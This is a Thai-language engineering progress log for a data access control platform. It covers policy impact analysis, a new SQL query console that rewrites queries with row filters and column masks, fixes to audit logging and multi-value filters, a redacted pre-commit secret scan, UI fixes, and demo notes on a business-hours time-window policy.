GET /api/v1/policies/b594579f…/impact   (finance-subscription, ACTIVE)
  tablesBound 1 · principalsKnown 4 · sampled false
  principalsAffected 2 · byChange { GAINS_ACCESS: 2, UNCHANGED: 2 }
  analyst_a GAINS_ACCESS  "can read this table"
  steward_c GAINS_ACCESS  "can read this table"

GET /api/v1/policies/1a294978…/impact   (pii-masking-below-l2, ACTIVE)
  principalsAffected 1 · byChange { SEES_LESS: 1, UNCHANGED: 3 }
  analyst_a SEES_LESS  "citizen_id, email now masked"
```

อ่านได้ตรงกับที่ควรเป็น: `finance-subscription` เป็น**ตัวเดียว**ที่เปิดประตู → ถอดออกแล้วสองคนหมดสิทธิ์ · `pii-masking-below-l2` แตะเฉพาะ `analyst_a` เพราะ `steward_c` clearance ผ่าน L2

> **ทำตามกับดักเดิมแล้ว** — restart backend ก่อนยิง เพราะ `verify` เพิ่งเขียนทับ `dac-service.jar` ใต้ JVM ที่เปิดไฟล์นั้นค้างอยู่ (ดู Z.5)

---

## รอบก่อนหน้านี้ (ข้อ A–Z) — Query console (5.2a ใช้งานได้จริง) + บั๊กร้ายแรงสามตัว

รอบนี้คือรอบที่ **โหมด 5.2 เดินจากต้นจนจบได้จริงเป็นครั้งแรก** — พิมพ์ SQL ในเบราว์เซอร์ -> rewrite ตาม policy -> ยิงลง Postgres จริง -> ได้แถวที่ถูก filter และ column ที่ถูก mask กลับมา พร้อม audit ครบ

### A. หน้า Query console (M7 / FR-6.3, 5.2a)

ผู้ใช้ถามว่า *"เวลา Query ข้อมูลใน Database นี่ต้องกดตรงไหน"* — คำตอบคือยังไม่มี จึงสร้างขึ้นรอบนี้ แบบเดียวกับ BigQuery / Denodo

| ไฟล์ | หน้าที่ |
|---|---|
| `frontend/app/src/api/query.ts` (ใหม่) | `runQuery()` + type `QueryResult` · `MAX_ROWS = 5000` · `DEFAULT_ROWS = 200` |
| `frontend/app/src/pages/query/SqlEditor.tsx` (ใหม่) | editor สามชั้น: gutter + `<pre>` ที่ไฮไลต์ + `<textarea>` ตัวอักษรใสทับอยู่บนสุด · tokenizer เขียนเอง · Ctrl/Cmd+Enter = run · Tab = indent · **ไม่ใช้ Monaco** (ไม่กี่ร้อยบรรทัด เทียบกับ bundle หลาย MB และไม่มีอะไรบนจอนี้ต้องใช้ language server) |
| `frontend/app/src/pages/query/SchemaExplorer.tsx` (ใหม่) | tree ฝั่งซ้าย สร้างจาก **asset cache ไม่ใช่ `information_schema`** — table ที่ crawl ยังไม่เห็น = table ที่ engine ยังไม่มี decision ให้ กดไปก็ได้แค่คำปฏิเสธ · column lazy-load · column ที่มี tag ติดป้าย `tagged` |
| `frontend/app/src/pages/query/QueryPage.tsx` (ใหม่) | เลือก source · **Run as** (ดูแบบคนอื่น FR-5.2) · purpose · row limit · ตาราง result · **แท็บ "Rewritten SQL" โชว์ SQL จริงที่ถูกส่งไป** (FR-5.4) · แถบ unenforceable |
| `navigation.ts` · `App.tsx` | เพิ่มเมนู Query + route |

### B. QueryRewriter — บั๊กสองตัวที่ทำให้ gate สองชั้นปฏิเสธทุก query

1. **gate ชั้นสองดู output แทน input** — หลัง rewrite แล้ว derived table **ต้อง** มีชื่อ table จริงอยู่ข้างในเสมอ gate ที่ไล่หาชื่อ table ใน SQL ผลลัพธ์จึงปฏิเสธทุกอย่าง รวมถึงของที่ rewrite สำเร็จ -> เปลี่ยนไปเทียบ "table ที่ walk เจอ" กับ "table ที่ parser เห็นทั้งหมด" แทน
2. **เหตุผลที่ตอบกลับตอนถูกปฏิเสธเป็นคนละเรื่อง** — ขึ้นว่า `access is denied: subject rule satisfied` เพราะหยิบ `reasons[0]` มาโดยไม่ดู `matched`/`effect` -> เขียนใหม่ให้เลือก **DENY ที่ matched ก่อน แล้วค่อย ALLOW ที่ไม่ matched**

เขียน `QueryRewriterTest` **16 tests** คุมทั้ง happy path, gate ทั้งสองชั้น, CTE, UNION, alias, hidden column, และ subquery ใน `WHERE EXISTS` ที่ต้อง **fail-closed**

### C. รูปร่างของ SQL ที่ proxy ใส่เข้าไป (ตัวอย่างจริงที่ capture มา)

ผู้ใช้ถามว่า *"ตอน proxy ใส่ Syntax อะไรเข้าไป"* — pattern คือ **ห่อ table ที่ถูกคุมไว้เป็น derived table**: mask อยู่ใน projection · row filter อยู่ใน `WHERE` ของ derived table · column ที่ซ่อนคือไม่ถูก list ออกมาเลย · `WHERE`/alias/`ORDER BY` ของผู้ใช้อยู่ **ข้างนอก**

ผู้ใช้เขียน:

```sql
SELECT full_name, email, salary FROM sales.customer
```

สิ่งที่ถูกส่งไปที่ Postgres จริง (`analyst_a`):

```sql
SELECT full_name, email, salary
FROM (SELECT "t"."id", "t"."full_name",
             regexp_replace(CAST("t"."email" AS text), '^[^@]+', '***', 'g') AS "email",
             CASE WHEN "t"."citizen_id" IS NULL THEN NULL
                  ELSE repeat('*', GREATEST(length(CAST("t"."citizen_id" AS text)) - 4, 0))
                       || right(CAST("t"."citizen_id" AS text), 4) END AS "citizen_id",
             "t"."phone", "t"."salary", "t"."branch_code", "t"."country", "t"."created_at"
      FROM "sales"."customer" "t"
      WHERE ("t"."branch_code" IN ('BKK-01'))) "customer"
```

### D. พิสูจน์โหมด 5.2 กับข้อมูลจริง

Source `demo-pg` (`dac-srcpg`, db `salesdb`) · `sales.customer` 4 แถว · policy 3 ตัว (`finance-subscription` ORG · `pii-masking-below-l2` ORG · `sales-branch-rls` SCHEMA)

| Run as | attribute | ผลลัพธ์ | โดนอะไร |
|---|---|---|---|
| `analyst_a` | clearance=L1 · country=TH · branch=BKK-01 | 2 แถว · `email` = `***@example.co.th` · `citizen_id` = `*********3456` | **RLS + Mask** |
| `steward_c` | clearance=L2 · country=TH · branch=BKK-01 **และ** CNX-01 | **3 แถว** · email/citizen_id เห็นเต็ม | RLS อย่างเดียว |
| `analyst_b` | country=SG | ถูกปฏิเสธ พร้อมชื่อ policy + เงื่อนไขที่ไม่ผ่าน | Subscription ตัด |
| admin (ไม่เลือก Run as) | – | ถูกปฏิเสธ — ไม่มี principal จึงไม่มี decision | fail-closed |
| ใครก็ได้ + `WHERE EXISTS (SELECT 1 FROM sales.customer)` | – | ถูกปฏิเสธ `does not rewrite` | gate ชั้นสอง |

### E. BUG — audit row หายหมดทุกแถว เพราะ `inet` ไม่รับสิ่งที่ Jetty ส่งมา

`ERROR: invalid input syntax for type inet: "[0:0:0:0:0:0:0:1]"` — Jetty คืน IPv6 loopback **พร้อมวงเล็บเหลี่ยม** แต่ `inet` ของ Postgres ไม่รับ -> insert throw -> `QueryService` catch แล้ว log ต่อ (ตั้งใจ ไม่ให้ audit ที่ล้มไปฆ่า query ที่ถูกอนุญาต) **ผลคือทุก query รันโดยไม่ถูกบันทึกเลย** ซึ่งคือการเสียหลักฐาน compliance ทั้งชุด (FR-8.2, FR-8.3)

แก้ด้วย `QueryService.inet()`: ตัดวงเล็บ · ตัด zone index (`fe80::1%eth0`) · **กรองด้วย regex ให้เหลือเฉพาะ IP literal ก่อน** แล้วค่อยเรียก `InetAddress.getByName` (ถ้าไม่กรองก่อน มันจะไป resolve DNS ซึ่งเป็นที่สุดท้ายที่ตอนเขียน audit ควรแตะ network) · **เสียที่อยู่ยอมได้ เสียทั้งแถวไม่ได้** · `QueryServiceInetTest` **6 tests**

หลังแก้: `grep -c "Could not write" backend-run.log` -> **0** · `client_ip` = `::1`

### F. BUG — `audit_decision.matched_policy_ids` ว่างทุกแถว

engine ใส่ `.withPolicyId(policy.getId())` ถูกแล้ว แต่ **`id` เป็น column ไม่ได้อยู่ใน JSON document** -> policy ที่ deserialize ออกมาจาก `document` มี `id == null` ทุกตัว -> audit บอกชื่อ policy ได้แต่ชี้กลับไปหาไม่ได้ (FR-5.4, FR-8.2)

แก้ที่ `PolicyStore.deserialise(id, document)` ให้ประทับ id ของ row กลับลงบน POJO และแก้จุดเดียวกันใน `PolicyBindingMaterializer` · **verify แล้ว** — แถวใหม่มี `matched_policy_ids` 2–3 ตัว

### G. BUG — multi-value attribute ไม่กลายเป็น `IN (...)` (FR-4.1 พัง)

`steward_c` มี `branch` สองค่า (BKK-01 **และ** CNX-01) แต่ SQL ที่ออกมาคือ `branch_code = 'BKK-01'` เฉยๆ -> เห็น 2 แถวแทนที่จะเป็น 3

ไล่แล้วไม่ใช่ `PrincipalLoader` (select ครบ) ไม่ใช่ `Principal.attributeValues` (เก็บครบ) ไม่ใช่ `PolicyEngine` (ส่ง `values` ครบ) — **อยู่ที่ `DecisionSql.compare`**: มัน switch ตาม `operator` ไม่ใช่ `kind` และ policy document เขียนว่า `{"kind":"IN_LIST","column":"branch_code","userAttribute":"branch"}` **ไม่มี `operator`** -> default เป็น `EQ` -> `EQ` อ่าน `values.get(0)` ตัวเดียว **ค่าที่เหลือหายเงียบ**

นี่คือบั๊กชนิดที่แย่ที่สุดในงานนี้: **SQL ที่ generate ออกมาหน้าตาถูกต้องทุกอย่าง ผิดแค่จำนวนแถว** และผิดในทางที่เข้มเกินไป เลยไม่มีใครร้อง

แก้ด้วย `DecisionSql.membership(kind, operator, count)`:

- `operator == null` + `kind == IN_LIST` -> `IN`
- `operator == null` อื่นๆ -> `EQ` (เหมือนเดิม)
- `EQ` แต่ได้ค่ามามากกว่าหนึ่ง -> **ขยายเป็น `IN`** (คนเขียนหมายถึง "ตรงกับค่าของผู้อ่าน" และผู้อ่านมีหลายค่า — กว้างขึ้นดีกว่าทิ้งทั้งหมดยกเว้นตัวแรก)
- `NE` ได้หลายค่า -> `NOT_IN`

`DecisionSqlRowFilterTest` **7 tests** (module `dac-compiler-sql` เพิ่งมี test เป็นครั้งแรก) · verify สด: `steward_c` ได้ `IN ('BKK-01', 'CNX-01')` -> **3 แถว**

### H. สามเรื่อง UI ที่ผู้ใช้ชี้

1. *"อันนี้ไม่ต้องมีสิ ให้เขาใส่ได้เองไหม"* — dropdown row limit 4 ตัวเลือก ไม่มีวันเป็นตัวเลขที่คนต้องการ -> เปลี่ยนเป็น `TextField` กรองเฉพาะตัวเลข + ข้อความ `(capped at 5000)` ข้างๆ เพราะ server clamp อยู่แล้ว field อิสระจึงพังอะไรไม่ได้
2. *"เวลา highlight แล้วมันหาย"* — selection ถูกวาดโดย `<textarea>` ที่อยู่ **บน** ชั้นที่มีตัวอักษรจริง สี selection ทึบจึงบังสิ่งที่กำลังเลือกอยู่ -> `tw:selection:bg-[rgba(41,112,255,0.28)]`
   > **บทเรียนทั่วไป: editor ที่ซ้อนชั้น ต้องใช้สี selection ที่มี alpha เสมอ**
3. *"อยากให้มี Expand, Collapse all"* — หน้า Governance เพิ่มปุ่ม Expand all / Collapse all ข้างช่อง filter · implement เป็น **คำสั่งครั้งเดียว (`{nonce, open}`) ไม่ใช่โหมด** — ถ้าเก็บเป็น boolean mode แล้ว "expand all" จะคอยง้างแถวที่ผู้อ่านเพิ่งปิดให้เปิดใหม่ตลอด

### I. คำถามที่ตอบไประหว่างรอบนี้ (เก็บไว้เพราะจะถูกถามอีก)

- **"เปลี่ยน database type แล้ว logic proxy ต้องเปลี่ยนไหม"** — ไม่ต้อง `QueryRewriter` + `PolicyEngine` ใช้ร่วมกันหมด ที่เปลี่ยนอยู่หลัง `SqlDialect` 4 method (`quote` / `literal` / `toText` / `mask`) · `QueryService.dialectFor(source)` เลือกจาก `source.engine()` · row limit ใช้ JDBC `setMaxRows` ไม่ได้เขียน `LIMIT`/`TOP` ลง SQL · **ความเสี่ยงจริงอยู่ที่ parser** — JSqlParser เข้าใจ ANSI เป็นหลัก T-SQL เฉพาะทาง (`OUTER APPLY`, query hint) อาจ parse ไม่ผ่านแล้วถูก reject ทิ้ง (ปลอดภัยแต่ผู้ใช้จะงง) ต้องทดสอบจริงตอนต่อ MSSQL · source ที่ไม่ใช่ SQL ต้องเขียน compiler คนละตัวที่กิน `PolicyDecision` เดียวกัน
- **"ต้องมี list ของ type ที่รองรับใช่ไหม"** — ใช่ มีแล้ว 3 ชั้น: (1) `DataSourceStore.Engine` + `Engine` ใน `enforcement.ts` = `POSTGRES | SQLSERVER` (2) capability matrix ต่อโหมด ใน `enforcement.ts` คำนวณสดตอนพิมพ์ policy (3) masking function ที่แต่ละ dialect สะกดได้ — **`REGEX_REPLACE` บน SQL Server โยน `UnsupportedMaskingException` ทิ้ง ไม่ degrade** · **ช่องว่าง:** ชั้น (3) ยังไม่ถูกดึงขึ้นมาใน matrix ของ UI และ matrix ยังไม่รู้จัก *เวอร์ชัน* (MSSQL 2019/2022/2025, PG มี extension `anon` ไหม)
- **"Access เป็น local policy ใช่ไหม"** — ไม่ใช่ เมนู Access คือ **Grant** (FR-7) ให้สิทธิ์ตรงๆ พร้อมวันหมดอายุ คนละเรื่องกับ policy ที่เขียนเป็นเงื่อนไข
- **"มีเก็บ log การรัน การ configure ไว้ไหม"** — query กับ decision กับ policy change มีครบ · **การ configure ไม่มีเลย** (เปลี่ยน data source / OM settings ไม่ถูกบันทึกที่ไหน) ดู Next Steps

### J. 🔴 Secret scan ก่อน commit — เจอของจริงสองรายการ

repo เป็น **public** ทุก commit อ่านได้ทั้งโลก ก่อน commit รอบนี้จึง scan สองชั้น:
ชั้นแรกเทียบกับ **ค่าจริงใน `.env`** (`IDENTITY_BOOTSTRAP_ADMIN_PASSWORD`, `OM_WEBHOOK_SECRET`, `FERNET_KEY`, `OM_JWT_TOKEN`, `SRC_PG_ARAK_CREDENTIAL`, `DAC_DB_PASSWORD`) → ผ่าน
ชั้นสองเป็น **pattern ทั่วไป** (password ที่พบบ่อย, JWT, private key, IP ภายใน) → **เจอสองรายการ และทั้งคู่เป็นของจริง**

| ไฟล์ | ของที่หลุด | แก้เป็น |
|---|---|---|
| `dac-service/.../policy/QueryServiceInetTest.java:23` | **IP ภายในของ OpenMetadata instance ของทีม** (`10.6.x.x` — ไม่เขียนเต็มซ้ำที่นี่) ถูกใช้เป็น fixture ของ IPv4 | `192.0.2.10` (TEST-NET-1, RFC 5737) + คอมเมนต์บอกเหตุผล |
| `dac-service/.../source/DataSourceStoreIT.java:95` | **รหัสผ่าน OpenMetadata จริงที่ผู้ใช้เคยพิมพ์ในแชท** ถูกใช้เป็น fixture ของ "รหัสผ่านที่ต้องถูกปฏิเสธ" | `not-a-real-secret` / `sa/not-a-real-secret` |

**บทเรียน:** fixture ทั้งสองตัว *ทำงานถูกต้อง* ทุกประการ — test เขียวมาตลอด สิ่งที่ผิดคือ**ค่าที่หยิบมาใช้** คนเขียน test มักหยิบค่าที่อยู่ตรงหน้า (IP ที่เพิ่ง curl, รหัสผ่านที่เพิ่งอ่าน) โดยไม่คิดว่ามันจะถูก push ขึ้น public repo
ข้อที่เจ็บกว่าคือ `DataSourceStoreIT` เป็น test ที่ตั้งใจพิสูจน์ว่า **`credential_ref` ต้องไม่รับรหัสผ่านดิบ** — แล้วดันเอารหัสผ่านจริงมาเป็นตัวอย่าง

⚠️ **รอบถัดมาเกิดซ้ำในที่เดิม** — หัวข้อ J ฉบับแรก **เขียน IP กับรหัสผ่านตัวจริงลงในตาราง** เพื่ออธิบายว่าลบอะไรออก — คือเอาค่าที่เพิ่งลบกลับมา commit ใหม่ในเอกสารที่ห้ามทำสิ่งนั้น secret scan รอบถัดไปจับได้และ redact แล้ว
> **ข้อสรุป:** เวลาบันทึกว่า “ลบค่า X ออก” **ห้ามเขียน X ลงไป** — ให้บรรยายว่ามันคืออะไร อย่าเขียนว่ามันคืออะไร

> **กติกาถาวร:** ค่าใน fixture ต้องเป็นค่าที่ **ใช้กับอะไรไม่ได้เลย** — IP ใช้ `192.0.2.x` / `198.51.100.x` / `203.0.113.x` (RFC 5737), host ใช้ `example.com`, secret ใช้สตริงที่อ่านแล้วรู้ทันทีว่าปลอม ห้ามหยิบค่าจาก environment จริงมาวาง

### K. คืนค่า time window ของ `finance-subscription` (ปิดช่องว่างข้อ 8)

ระหว่างรอบพิสูจน์ 5.2 มีการแก้ window เป็น `["MON-FRI","SAT","SUN"]` เพื่อไม่ให้ test ที่รันวันเสาร์ถูกปฏิเสธด้วยเหตุผลผิดเรื่อง — แต่ปล่อยไว้แปลว่า demo **ไม่ได้ demo time predicate อีกต่อไป**
คืนกลับเป็น `["MON-FRI"]` แล้ว (policy `b594579f-a825-42bc-9dac-64de9b279d03` → **version 4**) ผ่าน `PUT /api/v1/policies/{id}?version=&reason=`

> ⚠️ **API shape ที่หลงทางง่าย** — `PUT /policies/{id}` รับ **`Policy` document ตรงๆ เป็น body** ส่วน `version` กับ `reason` เป็น **query parameter** ไม่ใช่ `{document, expectedVersion, reason}` ใน body (ลองแบบหลังแล้วได้ 400)

ยืนยันผลสด (วันที่รัน = เสาร์ 2026-09-20):

```
POST /api/v1/query {"sourceId":"…","sql":"select * from sales.customer","asPrincipal":"analyst_a"}
→ 403 "Access to demo-pg.salesdb.sales.customer is denied.
        finance-subscription did not apply: outside the policy's permitted time window"
```

เท่ากับพิสูจน์ **E2E ข้อ 15** (นอกเวลาทำการต้อง deny) และ **FR-5.4 explainability** (บอกชื่อ policy + เหตุผลที่ไม่ผ่าน) ไปพร้อมกัน
**ผลข้างเคียงที่ต้องรู้:** ถ้าเปิดหน้า Query ในวันเสาร์-อาทิตย์ หรือนอก 08:00–18:00 Asia/Bangkok จะถูกปฏิเสธ — **นั่นคือพฤติกรรมที่ถูกต้อง ไม่ใช่บั๊ก**

> ⚠️ **`QueryResource.Ask` ใช้ชื่อ field `sourceId` ไม่ใช่ `dataSourceId`** — ส่งผิดชื่อได้ 400 `"Say which source to run against"` ซึ่งอ่านแล้วเหมือน id หายไป ทั้งที่ส่งไปแล้ว

### L. Catalog — เปลี่ยนแถวชิป facet เป็น filter rail แบบ OpenMetadata Explore

เดิม facet filter เป็น**แถวชิปที่ wrap ไปเรื่อยๆ** (Tags / Domains / Classifications / Tier) — ผู้ใช้บอกว่า "ไม่สวย ทำให้เหมือน openmetadata สิ"
ปัญหาจริงไม่ใช่แค่ความสวย แต่คือ **ชิปเป็นรูปทรงที่ผิดสำหรับข้อมูลที่เป็นลำดับชั้น**: sub-domain สามตัวใต้ `Premium Service Delivery` ขึ้นต้นด้วยอักษรชุดเดียวกัน 24 ตัว พอถูก CSS ตัดให้พอดีชิป มันเหลือเป็นข้อความ**เหมือนกันเป๊ะทั้งสามอัน** — filter ที่แยกตัวเลือกไม่ออกแย่กว่าไม่มี filter

แทนที่ `FacetPicker` ด้วย `FacetRail` + `FacetGroup` ใน [CatalogPage.tsx](frontend/app/src/pages/catalog/CatalogPage.tsx):

| ของเดิม | ของใหม่ |
|---|---|
| ชิป wrap แนวนอนเหนือผลลัพธ์ | rail ซ้าย `w-64` sticky · หนึ่งค่า = หนึ่งบรรทัด |
| `shortFqn()` (ตัดหัว เหลือ `… / tail`) | `leaf()` + **indent ตามความลึกของ FQN** (12px/ชั้น, cap 3 ชั้น) + `title` เป็น FQN เต็ม |
| เรียงตามจำนวน asset | **เรียงตาม FQN** เพื่อให้ parent อยู่บรรทัดเหนือลูกเสมอ — ไม่งั้น indent จะโกหกว่าใครอยู่ใต้ใคร |
| ไม่มี | กลุ่มพับได้ · badge นับ filter ที่เลือก · search ในกลุ่มเมื่อมี ≥10 ค่า · `Show all N` เมื่อเกิน 6 ค่า |
| ไม่มี | ค่าที่**ติ๊กไว้แล้วถูกวาดเสมอ** แม้หลุดจาก preview หรือ search — filter ที่มองไม่เห็นคือ filter ที่ปลดไม่ได้ |

ตรวจแล้ว: `tsc --noEmit` ผ่าน · `npx jest` **7 suites / 25 tests เขียวหมด** · screenshot ผ่าน Playwright (Edge) ยืนยันหน้าตา

**กับดักสี่อันที่เจอระหว่างทาง — จดไว้ให้ไม่ต้องเสียเวลาซ้ำ:**

1. **Tailwind 4 prefix ต้องมาก่อน breakpoint** — `tw:lg:block` ✅ / `lg:tw:block` ❌ (เขียนผิดแล้ว class เงียบหาย Playwright ฟ้อง "locator resolved to hidden")
2. **JSX comment `{/* */}` วางระหว่าง `return (` กับ element ไม่ได้** — กลายเป็นสอง expression → Babel ฟ้อง `Unexpected token, expected ","` ต้องใช้ `//` เหนือ `return (` แทน
3. **test runner ของโปรเจกต์นี้คือ Jest ไม่ใช่ vitest** — `npx vitest run` จะไปกวาด `e2e/smoke.spec.ts` แล้วพังทั้ง 8 suites ใช้ `npx jest`
4. **`Checkbox` ที่ vendor มาจาก OM render `<label>` ของตัวเองอยู่แล้ว** — เอาไปซ้อนใน `<label>` อีกชั้น input จะ**ไม่มี accessible name เลย** ต้องใช้ `<div>` + `aria-label` ชัดๆ (ใส่เป็น FQN เต็ม เพราะ "Sensitive" เฉยๆ ไม่บอกว่าเป็นของ classification ไหน) แล้วให้ข้อความที่มองเห็นเป็น `<button tabIndex={-1}>`

> icon `Collapse01` **ไม่มี** ใน `@untitledui/icons` — ที่มีคือ `ChevronDown`, `ChevronRight`, `FilterLines`, `Minimize01`, `Maximize01`, `Expand01`

### M. 🔴 คำแนะนำ "ลองใน UI ยังไงให้เห็น RLS + Mask" ที่เคยให้ไว้ — **ผิด** แก้แล้ว

ผู้ใช้ลองทำตามแล้วได้ `Refused` ทันที สาเหตุมีสองข้อ **และเป็นความผิดของคำแนะนำทั้งคู่**

**ข้อ 1 — ตารางเดิมบอกว่า "ไม่เลือก Run as → query ในฐานะ `admin` → ไม่โดนอะไรเลย" ซึ่งกลับหัวกลับหางกับความจริง**
`admin` **ไม่ได้อยู่ใน subject ของ `finance-subscription`** เลย → โดน **default-deny** ตาม FR-3.3 ไม่ใช่ "เห็นครบทุกแถว"
พิสูจน์สด:

```
run as (nobody -> admin)
→ "finance-subscription did not apply:
   principal is none of the roles, teams, groups or users the policy names"
```

> นี่เป็นพฤติกรรมที่**ถูกต้อง** — platform admin คุม *ระบบ* ไม่ได้แปลว่าเห็น *ข้อมูล* (separation of duty ตาม FR-2.6) แต่คำแนะนำเดิมเขียนตรงข้าม

**ข้อ 2 — วันที่ลองคือเสาร์ ส่วน window เพิ่งถูกคืนเป็น `MON-FRI` ในรอบเดียวกัน (ดูหัวข้อ K)** → ต่อให้เลือก `analyst_a` ถูกก็ยังโดนปฏิเสธอยู่ดี ด้วยเหตุผลคนละอัน

ผลจริงทั้งสี่เคส วันเสาร์ 2026-09-20:

| Run as | ผลลัพธ์ |
|---|---|
| `admin` (ค่า default) | ❌ `principal is none of the roles, teams, groups or users the policy names` |
| `analyst_a` | ❌ `outside the policy's permitted time window` |
| `steward_c` | ❌ `outside the policy's permitted time window` |
| `analyst_b` | ❌ `expression is false for this principal: user.country == asset.prop('dataResidency')` ← **อันนี้ถูกต้องตามดีไซน์** |

**ตารางที่ถูกต้อง** (ใช้ได้เมื่อ window เปิดอยู่ — ดูสวิตช์ด้านล่าง):

| Run as | attribute | เห็นอะไร | โดนอะไร |
|---|---|---|---|
| `analyst_a` | clearance=L1 · country=TH · branch=BKK-01 | 2 แถว · `email` = `***@example.co.th` · `citizen_id` = `*****3456` | **โดนทั้ง RLS และ Mask ← อันนี้คืออันที่ต้องลอง** |
| `steward_c` | clearance=L2 · country=TH · branch=BKK-01 + CNX-01 | 2 แถว · email/citizen_id เห็นเต็ม | โดน RLS อย่างเดียว — L2 ผ่าน mask |
| `analyst_b` | country=SG | ไม่เห็นอะไรเลย | โดน Subscription policy ตัด |
| `admin` / ไม่เลือก | – | **ไม่เห็นอะไรเลย** | **โดน default-deny — ไม่ใช่ "เห็นหมด"** |

#### สวิตช์ time window — [scripts/demo-time-window.py](scripts/demo-time-window.py)

ปัญหาเชิงออกแบบที่โผล่มาจากเรื่องนี้: **ไม่มีค่า default ของ window ที่ถูกทั้งสองทาง**
ตั้งเป็นเวลาทำการ → demo ปฏิเสธทุกเย็นและทุกเสาร์อาทิตย์ ซึ่งเป็นเวลาที่คนมานั่งดูจริงๆ และสิ่งที่เห็นคือ refusal ที่ไม่ได้พูดถึง RLS หรือ mask เลย
ตั้งเป็นเปิดตลอด → ไม่เคยได้ demo time predicate

จึงทำเป็น**สวิตช์** แทนที่จะเถียงกันว่า default ควรเป็นอะไร:

```bash
python scripts/demo-time-window.py open     # ทุกวัน ทุกเวลา — ใช้ตอน demo RLS/mask
python scripts/demo-time-window.py office   # MON-FRI 08:00-18:00 — ใช้ตอน demo time predicate
```

> ⚠️ **สถานะตอนนี้ = `office`** (จากหัวข้อ K) — แปลว่า **หน้า Query จะปฏิเสธจนถึงวันจันทร์ 08:00 Asia/Bangkok**
> สคริปต์ถูกเขียนแล้วแต่ **ยังไม่ได้รัน** เพราะ auto-mode classifier บล็อกด้วยเหตุผล `Security Weaken` (การขยาย time window ของ access policy อ่านแล้วเหมือนการลดความปลอดภัย ซึ่งเป็นการบล็อกที่สมเหตุสมผล) — **ผู้ใช้ต้องรันเองหนึ่งครั้ง**

### N. ตรวจหน้า Query ด้วยตาเป็นครั้งแรก (ปิดช่องว่างข้อ 7) — เจอ bug ใน `Select` ที่ vendor มา

หน้า `/query` **ไม่เคยถูกเปิดดูจริงเลย** ตั้งแต่สร้างมา — screenshot ผ่าน Playwright (Edge) แล้วเจอของจริงสองอย่าง

**1. Select ของ source แสดงชื่อเหลือตัวเดียว** — `demo-pg  POSTGRES · localhost:5433` ถูก render ออกมาเป็น `c POSTGRES · localhost:5433`
ต้นเหตุอยู่ใน [ui-core-components/.../select.tsx](frontend/ui-core-components/src/components/base/select/select.tsx) — ใน trigger นั้น `label` มี `tw:truncate` (หดได้) แต่ `supportingText` **ไม่มีทั้ง `truncate` และ `min-w-0`** → ใน flex row ตัวที่หดไม่ได้จะยืนยันความกว้างเต็ม แล้วโยนการหดทั้งหมดไปให้ label
นั่นแปลว่า **ข้อความรอง ชนะ ข้อความหลัก** — ส่วนที่บอกว่าผู้ใช้เลือกอะไรอยู่คือส่วนที่หาย กระทบ**ทุก Select ในแอป** ไม่ใช่แค่หน้านี้
แก้โดยให้ `supportingText` เป็น `tw:min-w-0 tw:shrink-[9999] tw:truncate` → มันยอมหดก่อนเสมอ ชื่อ source จึงอยู่ครบ

**2. ตัวเลือก Run as ชื่อ `As myself` ทำให้เข้าใจผิด** — แก้เป็น `As myself (policies apply)` และให้ banner อธิบายทั้งสองกรณี (เดิมขึ้นเฉพาะตอนเลือกคน) — การเงียบตอนไม่ได้เลือกคือสิ่งที่ทำให้คนอ่าน refusal แล้วคิดว่าระบบพัง

### O. หน้า Query บอกได้แล้วว่า "โดน policy อะไรไปบ้าง" ไม่ใช่แค่ส่ง SQL ที่ rewrite แล้วมาให้อ่านเอง (FR-5.4)

**ที่มา:** ผู้ใช้ขอ "ให้ผมลอง RLS, masking ให้เห็นภาพใน UI"
ปัญหาคือก่อนหน้านี้ผลลัพธ์**ไม่ได้บอกอะไรเลย**ว่าเกิดอะไรขึ้น:

- แถวที่ถูก RLS ตัดออก → **หายไปเฉยๆ** ไม่มีอะไรบอกว่าหายเพราะอะไร
- column ที่ถูก mask → ขึ้นเป็น `***@example.co.th` ซึ่ง**อ่านแล้วเหมือนข้อมูลจริงที่หน้าตาแปลก** มากกว่าเหมือนถูก mask
- คนที่จะรู้ความจริงได้ต้องไปเปิดแท็บ `Statement that ran` แล้วอ่าน SQL ที่ generate มา ซึ่งเป็นการขอมากเกินไปจากคนที่แค่อยากดูว่า policy ทำงานไหม

> นี่คือช่องว่าง FR-5.4 ในหน้าจอนี้ — "decision ที่อธิบายไม่ได้ คือ decision ที่ไม่มีใครกล้า enforce"

#### สิ่งที่ทำ — ลาก `PolicyDecision` ออกมาจนถึงหน้าจอ

เดิม `QueryRewriter` เก็บ `Map<String, Governed>` (มี `PolicyDecision` เต็มๆ อยู่ในมือ) แล้ว **โยนทิ้ง** เหลือแต่ชื่อ asset

| ชั้น | เปลี่ยนอะไร |
|---|---|
| [QueryRewriter.java](backend/dac-proxy/src/main/java/com/mfec/dac/proxy/QueryRewriter.java) | `Rewritten` เพิ่ม field `List<Governed> governed` — เก็บ decision ไว้แทนที่จะทิ้ง (ยังคง `assets` ไว้เหมือนเดิม ไม่ทำให้ของเดิมพัง) |
| [QueryService.java](backend/dac-service/src/main/java/com/mfec/dac/policy/QueryService.java) | เพิ่ม record `Explanation(asset, maskedColumns, hiddenColumns, rowFilters, policies)` + เมธอด `explain()` ที่แปลง decision เป็นภาษาคน |
| [QueryResource.java](backend/dac-service/src/main/java/com/mfec/dac/resources/QueryResource.java) | ใส่ `explanations` ลงใน response body |
| [api/query.ts](frontend/app/src/api/query.ts) | type `Explanation` |
| [QueryPage.tsx](frontend/app/src/pages/query/QueryPage.tsx) | `AppliedPolicies` แถบเหนือตาราง + badge `masked` บนหัว column |

**สิ่งที่เห็นบนจอตอนนี้** (แถบเหนือตารางผลลัพธ์):

```
🛡 demo-pg.salesdb.sales.customer   [sales-branch-rls (SCHEMA)] [pii-masking-below-l2 (ORG)]
   ▽ Rows kept where branch_code is one of BKK-01
   ◎ citizen_id  hidden except the last 4 characters
   ◎ email       rewritten by pattern ^[^@]+
```

และบนหัว column ของ `email` / `citizen_id` มีป้าย `masked` (hover เห็นรายละเอียด)

#### การตัดสินใจเชิงออกแบบสามข้อ

1. **สร้างคำอธิบายจาก `PolicyDecision` ไม่ใช่จาก SQL** — SQL เป็นแค่ *หนึ่งใน* สาม rendering ของ decision เดียวกัน (FR-6.0c) ถ้าไปอ่านจาก SQL คำอธิบายจะจริงเฉพาะโหมด proxy แล้วต้องเขียนใหม่อีกสองรอบตอนทำ 5.1.1 / 5.1.2
2. **วางไว้เหนือตาราง ไม่ใช่ในแท็บ Job details** — คนที่เปิดหน้านี้กำลังเทียบ principal สองคนอยู่ สายตาอยู่ที่แถว ไม่ได้อยู่ที่แท็บอื่น
